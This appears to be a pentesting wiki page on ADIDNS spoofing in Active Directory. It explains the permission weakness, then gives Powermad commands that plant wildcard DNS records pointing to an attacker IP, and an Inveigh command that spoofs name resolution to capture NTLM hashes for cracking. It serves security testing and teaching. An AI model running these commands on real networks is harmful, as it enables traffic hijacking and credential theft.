# ADIDNS spoofing

## Theory

In order to function properly, Active Directory services need DNS. In that matter, Active Directory Domain Services \(AD-DS\) offer an integrated storage and replication service for DNS records. This is called Active Directory Integrated DNS \(ADIDNS\).

Just like any other domain name resolution spoofing attack, if an attacker is able to resolve requests with an arbitrary IP address, traffic gets hijacked, the attacker becomes a man-in-the-middle and further attacks can be operated.

Since ADIDNS zone DACL \(Discretionary Access Control List\) enables regular users to create child objects by default, attackers can leverage that and hijack traffic.

ADIDNS zones can be remotely edited

* with **dynamic updates** \(a DNS specific protocol used by machine accounts to add and update their own DNS records\). Users can create records if they don't exist, and they will have full control over it. By default, users that don't own a record will not be able to edit it, or to add another one with the same name, even if the type is different \(A, AAAA, CNAME, MX, and so on\).
* by **using LDAP** to create dnsNode objects. While dynamic updates can't be used to inject a wildcard DNS record, LDAP can be \(only if the record doesn't already exist, which is the case by default\).

> Wildcard records allow DNS to function in a very similar fashion to LLMNR/NBNS spoofing. Once you create a wildcard record, the DNS server will use the record to answer name requests that do not explicitly match records contained in the zone. \([source](https://blog.netspi.com/exploiting-adidns/#wildcard)\)

## Practice

### Manual record manipulation

On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add/view/edit/enable/disable/remove records. In the following examples, the wildcard \(`*`\) record is targeted but the examples should also work with other records \(except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)\).

{% tabs %}
{% tab title="Get/Read" %}
The following command can be used to get the value populated in the DNSRecord attribute of a node.

```bash
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord
```
{% endtab %}

{% tab title="Add" %}
The following command creates a wildcard record, sets the `DNSRecord` attribute and sets the `DNSTombstoned` attribute, allowing any authenticated user to perform modifications to the node \(this helps maintain control of the node, even when the owner accounts gets deleted. Pretty useful after a pentest\).

```bash
New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
```
{% endtab %}

{% tab title="Set/Edit" %}
The `Set-ADIDNSNodeAttribute` function can be used to append, populate, or overwrite values in a DNS node attribute. In this case, the command below can be used to set/overwrite the record's value.

```bash
Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose
```
{% endtab %}

{% tab title="Enable" %}
A tombstoned record can be turned again into a valid record with the following command. This should be used in place of `New-ADIDNSNode` when working with nodes that already exist due to being previously added.

```bash
Enable-ADIDNSNode -Node *
```
{% endtab %}

{% tab title="Disable" %}
A record can be disabled \(i.e. tombstoned\) with the following command. This means the record will still exist but will not be used when resolving names.

```bash
Disable-ADIDNSNode -Node *
```
{% endtab %}

{% tab title="Remove" %}
The following command can be used to fully remove a record.

```bash
Remove-ADIDNSNode -Node *
```
{% endtab %}

{% tab title="Check/Resolve" %}
While `ping` can absolutely be used for the job, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to resolve names \(all DNS spoofing attacks need to be stopped in order to avoid false results\).

```bash
Resolve-DnsName NameThatDoesntExist
```

That command will either return an IP address, indicating that the wildcard record exists \(or that `NameThatDoesntExist` is an actual explicit record\), or return an error stating that the DNS name doesn't exist, indicating that the wildcard record doesn't exist.
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**TL; DR**: the following command will add a new wildcard record \(if it doesn't already exist\) with the attacker IP set in the DNSRecord attribute

```bash
New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
```
{% endhint %}

{% hint style="warning" %}
**Warning**: in some environments, the disabling or removal of the records created for tests failed. The records were shown as tombstoned or nonexistant when using functions like Get-ADIDNSNodeOwner, Get-ADIDNSNodeAttribute, and so on. However, the DNS Manager console was still showing those records and name resolution was still effective. It will probably stay an unsolved mystery for me, but testers need to keep this in mind.
{% endhint %}

More help on usage, support functions, parameters and attacks [here](https://github.com/Kevin-Robertson/Powermad#adidns-functions).

On UNIX-like systems, [adidnsdump](https://github.com/dirkjanm/adidnsdump) \(Python\) can be used for enumeration and export of all DNS records in the Active Directory Domain or Forest DNS zones.

```bash
adidnsdump -u "DOMAIN\user" -p 'password' --include-tombstoned $DOMAIN_CONTROLLER
grep "*" records.csv
```

### Dynamic spoofing

Using [Inveigh](https://github.com/Kevin-Robertson/Inveigh) \(Powershell\), the following command will 

* operate [LLMNR, NBT-NS and mDNS spoofing](llmnr-nbtns-mdns.md)
* operate ADIDNS spoofing
  * `combo` looks at LLMNR/NBNS requests and adds a record to DNS if the same request is received from multiple systems
  * `ns` injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad. 
  * `wildcard` injects a wildcard record
* set the threshold at which the combo ADIDNS spoofing mode will take effect
* enable showing NTLM challenge/response captures from machine accounts
* set the Challenge to `1122334455667788` \(to [crack NTLM hashes](../credentials/cracking.md#practice) with [crack.sh](https://crack.sh/)\)

```text
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

[This wiki page](https://github.com/Kevin-Robertson/Inveigh/wiki/Basics) can be really useful to help master Inveigh and its support functions

* `Clear-Inveigh` to clear Inveigh's hashtable
* `Get-Inveigh` to get data from Inveigh's hashtable
* `Stop-Inveigh` to stop all running modules
* `Watch-Inveigh` to enable real time console output

## References

{% embed url="https://blog.netspi.com/exploiting-adidns/" %}

{% embed url="https://blog.netspi.com/adidns-revisited/" %}

{% embed url="https://snovvcrash.rocks/2020/12/28/htb-hades.html\#spoofing-active-directory-integrated-dns" %}



